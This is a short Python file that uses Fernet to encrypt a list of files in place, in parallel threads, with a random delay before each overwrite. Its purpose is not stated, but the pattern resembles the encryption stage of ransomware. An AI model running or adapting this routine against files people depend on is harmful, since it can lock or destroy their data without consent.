# Encrypted_code.py
import time
import random
from Get_Key import key
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor

# 8/14/2025
# Encrypted Code
# AUX-441


keys = key()
real_key = Fernet(keys)


def encrypt_file_inplace(file_path, fernet):
    with open(file_path, "rb") as f_in:
        data = f_in.read()
    encrypted = fernet.encrypt(data)

    time.sleep(random.randint(1,3))

    with open(file_path, "wb") as f_out:
        f_out.write(encrypted)
    print(f"Encrypted in-place: {file_path}")


def encrypt_files_parallel(file_list, fernet):
    with ThreadPoolExecutor() as executor:
        executor.map(lambda f: encrypt_file_inplace(f, fernet), file_list)


